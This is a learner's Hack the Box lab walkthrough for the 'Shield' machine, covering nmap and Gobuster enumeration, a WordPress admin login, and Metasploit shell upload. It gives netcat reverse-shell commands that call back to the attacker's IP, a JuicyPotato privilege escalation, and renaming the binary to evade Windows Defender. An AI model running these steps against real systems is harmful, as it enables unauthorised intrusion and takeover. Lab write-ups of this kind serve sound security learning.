# Shield

Welcome to Another walkthrough! This walkthrough will be based on Hack the Box starting point machine "Shield". Remember all links in this walkthrough will lead you to educatonal sources to learn more about the topic I am discussing at that point in time. I will try to do my best to explain everything in detail, but keep in mind I am learning just like you are! I hope this helps you as much as it is going to help me and enjoy your journey! 
# Enumeration
Step 1: Nmap Scan
  - As always we are going to start out with our friendly nmap scan `nmap -sS -A -oN NMAP.txt 10.10.10.29`
    - This command will scan the machine and output the results to a text file "NMAP.txt"
    ![image](https://user-images.githubusercontent.com/29686845/134412007-c23344ed-3160-4531-9386-8df0a3c6ab16.png)
  - We see that two ports are open: Port 80/tcp HTTP and Port 3306/tcp mysql. 

Step 2: Port 80: HTTP
  - Lets check out port 80 the webpage.
      ![image](https://user-images.githubusercontent.com/29686845/134413396-20d418a2-ab0e-4587-8954-1b4b351b3193.png)
    - We seem to land on a [IIS](https://docs.microsoft.com/en-us/troubleshoot/iis/configure-default-document-iis)             starting page. 
      - I tried using burpsuite and checking the webpage source/storage to see if there were any subdirectories we can           gain access too or if there were any cookies we could exploit as we did in the machines Ooopsie & Vaccine.             There was no useful information there either. 
    - Eventhough this doesn't give us much information it does give us an important piece of the puzzle. We now know that       they are running windows server (Just incase you didn't pick that up from the nmap scan). In turn we might need to       run windows commands in the future.
    - Instead lets try using the tool [GoBuster](https://tools.kali.org/web-applications/gobuster).

Step 3: GoBuster
  - [GoBuster](https://tools.kali.org/web-applications/gobuster) is a tool that allows us to brute force URIs or             directories or files in webpages and to brute force DNS sub-domains. 
  - If you dont already have GoBuster installed (which I did not) Run the command `sudo apt install gobuster` 
    - Lets run the command: 
    - `gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt`
      - lets break down this command down a little bit since we are running a new tool.
      - gobuster: is the tool that we are calling to use
      - dir: is the windows equvalent to ls
      - -u: is to sepcifiy the target URL
      - -w: is to specifiy a wordlist. In this case we are going to use the common.txt.
    - Now we are going to let this run while it brute forces the password so we can get into different directories.           This may take a few minutes to complete.
      ![image](https://user-images.githubusercontent.com/29686845/134419257-79fa5f82-f03d-4b6a-900a-75b400fe5594.png)
    - We see that there is a is another directory /wordpress. so lets add that to our url. 
    - It should loook like `http://10.10.10.29/wordpress` 

# Foothold

Step 1: Word Press. 
  - The wepage seems to be a site advertising an electric truck with a smoke screen despensor and run flat tires. After exploring the page and more specifically exploring their blog we can find a link to log in. 
      ![image](https://user-images.githubusercontent.com/29686845/134676948-446c1e95-6e10-43c7-a2d0-9b0edcbabf26.png)
      ![image](https://user-images.githubusercontent.com/29686845/134677083-ba663149-978f-4dcb-9807-680cff595e87.png)
    - One thing to keep in mind is that the website is using [WordPress](https://wordpress.com/). WordPress is a a           Content Maagement system (CMS) that allows users to spin up a webpage or blog quickly and effiecently.
    - WordPress gerenally uses the username `admin` for the default credentials and since all the starting point             machines seem to follow eachother; we can try previous passwords we have from other machines to see if it works.
    - After some trial and error we find that the username and password is `admin : P@s5w0rd!`
      ![image](https://user-images.githubusercontent.com/29686845/134679391-7eb7bbdb-d230-47ca-a716-360fcead5bcd.png)
    - Now that we have access to the admin page we can look around, but it doesn't seem like we will have much access         to anything useful. 
    - I did some Research on [exploiting WordPress](https://hackertarget.com/attacking-wordpress) and it seems we can         exploit it with Metasploit's [msfconsole](https://www.offensive-security.com/metasploit-unleashed/msfconsole/)

Step 2: msfconsole
  - Metasploits [msfconsole](https://www.offensive-security.com/metasploit-unleashed/msfconsole/) is an all in one tool     that provides many different resources for enumertion, exploitation, and much more.
  - based on the exploit that I reviewed which used one of the tools in `exploit/unix/webapp` so i decided I would look     there to see if anyhting of interest. 
    - we can use the command: `search exploit/unix/webapp/wp` to see what options that Metasploit has to offer.
    - The first option we can see is `wp_admin_shell_upload` whcih catches my eye.
      ![image](https://user-images.githubusercontent.com/29686845/134682886-bcee6fc3-69ec-4c87-a47f-0cae241ad3dc.png) 
    - Metasploit offers a a few options that we can use to call this command from our search command: `use 0` or we can       call the whole tool and path with: `use /exploit/unix/webapp/wp_admin_shell_upload`
      - You can only use the `use 0` command after you have done a seaerch. your calling the number of results from our         search, so if you wanted to use a different exploit you would call that numver instead.
  - Now we are going to set some optoins before we run our exploit. This will tell msfconsole the who/what/when/where       to attack with our exploit.
    - `set USERNAME admin`
    - `set PASSWORD P@s5w0rd!`
    - `set TARGETURI /wordpress
    - `set RHOSTS 10.10.10.29`
    - `set LHOST < to your tun0 IP address >` (Forgot this and realized when it wasn't wokring)
      ![image](https://user-images.githubusercontent.com/29686845/134686497-8936a54b-69f9-4fcd-b98b-b7c4f8f300c4.png)
    - We have all of our peramaters set now lets run the exploit. we can type `run` or `exploit` <-- the funniest one         of the two. 
      ![image](https://user-images.githubusercontent.com/29686845/134688488-b5465433-988a-429f-966f-d0d8d2ce9f40.png)
    - Now we have our meterpreter connection and we can get a shell by typing `shell` 
      - shell can be a little finicky at times so we can work with it or we can upgrade our shell with netcat to               provide us with more stable shell.

Step 3: Netcat

  - Kali Linux has builting resources and scripts and we are going to be calling on nc.exe to upgrade our meterpreter       shell.
    - in your kali machine directory `/usr/share/windows-resources/binaries/` you will find the nc.exe. 
    - We can copy that with the `cp` command to any directory you would like and we can call on it withing our               meterpreter as long as we provide the absolute path.
    - Within our meterpreter session lets use the local change directory command (lcd):
    - `lcd /home/splash/HTB/Starting_Point/Shield` this is my direct path to the nc.exe. (you will use yours)
    - still within our meterpreter session we will change the directory to:
    - `\inetpub\wwwroot\wordpress\wp-content\uploads`
    - Now lets upload our nc.exe with `upload nc.exe`
      ![image](https://user-images.githubusercontent.com/29686845/134699318-166baca3-2660-4a5d-b9df-98403840bff9.png)
    - We have our .exe file uploaded, so lets set up a listner and execute it:
    - run our listener `nc -lvnp 1234` in another terminal on your kali machine
    - run `execute -f nc.exe -a "-e cmd.exe 10.10.14.14 1234"` in our meterpreter session. (Keep in mind that is your         tun0 ip and set listening port)
      ![image](https://user-images.githubusercontent.com/29686845/134704321-d793013a-501c-4785-94de-df6ff2c87601.png)
      ![image](https://user-images.githubusercontent.com/29686845/134704375-c84761db-08a2-462c-b7db-2d0b73595884.png)
    - We have successful set up our more stable reverse shell.

# Privilege Escalation

Here is a [cheatsheet](http://www.cs.columbia.edu/~sedwards/classes/2015/1102-fall/Command%20Prompt%20Cheatsheet.pdf) for linux to windows commands. We are going to need it moving forward since we have a shell into a windwos machcine.

Step 1: System Information
  - First lets get some information about the system we are conencted to and see if we can find a way to get admin/root permissions.
    - Lets start by running the `systeminfo` command.
      ![image](https://user-images.githubusercontent.com/29686845/134710727-8bc1854d-0610-4911-8430-dcfc1a83ba00.png)
    - We see that we find that the os is Windows Server 2016 Standard, Version: 10.0.143393 Build 14383

Step 2: Juicy Potato
  - We are going to use a tool called [Juicy Potato](https://github.com/ohpe/juicy-potato.git). This is a varient of       the tool [Rotton Potato](https://github.com/breenmachine/RottenPotatoNG). This allows services accounts to escalate     to SYSTEM privilges by leveraging the [BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-           intelligent-transfer-service-portal). Along with privileged access tokens in order to complete a [MiTM]                 (https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/) or Man in the Middle attack. 
    - now we need an exe file from the [Juicy Potato](https://github.com/ohpe/juicy-potato.git) git page.                     Unfrotuinatly, the exe we are looking for is not there and I have looked through all repositiores, but was             eventually found when you add /releases to the end of the github link. It should look like:
    - `https://github.com/ohpe/juicy-potato/releases` 
    - Download the file and make it executable with `chmod +x JuicyPotato.exe`
    - Now lets upload it too the server.
      ![image](https://user-images.githubusercontent.com/29686845/134717625-76ce60bc-8627-4f20-9cae-fafbedccaab0.png)
    - We have to change the name of the file, so that when we run it windows defender wont flag it and kill the process
    - to rename it use the move command `mv JuicyPotato.exe js.exe`
    -  next lets run the start command and execute a powershell terminal.
    -  `echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.14 1111 >                 shell.bat`
    -  Lets set up another listener and call on the shell.bat file we just created.
    -  `js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337 -c {bb6df56b-cace-11dc-9992-0019b93a3a84}`
    -  now if you go over to your netcat listner we have a new administrator shell.

# Post Exploitatoin

Step 1: Exploring

  - We start off in the system32 director in the windows server.... which we don'tt necessarily need so lets `cd \` to     get to our root directory.
  - You will find our root.txt in `c:\Users\Administrator\Desktop`. We can use the command `get-content root.txt` to read the file and get the flag to input it into hack the box.
